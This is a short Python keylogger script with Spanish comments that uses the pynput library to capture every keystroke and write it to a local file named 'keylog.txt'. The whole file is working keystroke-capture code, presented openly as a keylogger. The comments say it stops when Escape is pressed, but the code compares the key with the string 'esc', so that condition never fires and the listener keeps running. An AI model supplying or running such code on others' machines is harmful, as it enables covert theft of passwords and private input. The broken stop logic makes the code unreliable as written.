from pynput.keyboard import Listener
import logging

# Configuración de logging
file_log = "keylog.txt"  # Puedes cambiar el nombre del archivo aquí
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

# Función que maneja el evento de la tecla presionada
def on_press(key):
    try:
        # Registra la tecla presionada
        logging.log(10, str(key.char))
    except AttributeError:
        # Si no es un carácter imprimible (como Shift, Ctrl, etc.)
        logging.log(10, str(key))

# Función para detener el keylogger
def on_release(key):
    if key == 'esc':
        # Detener el listener si se presiona 'esc'
        return False

# Iniciar el listener de teclas
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
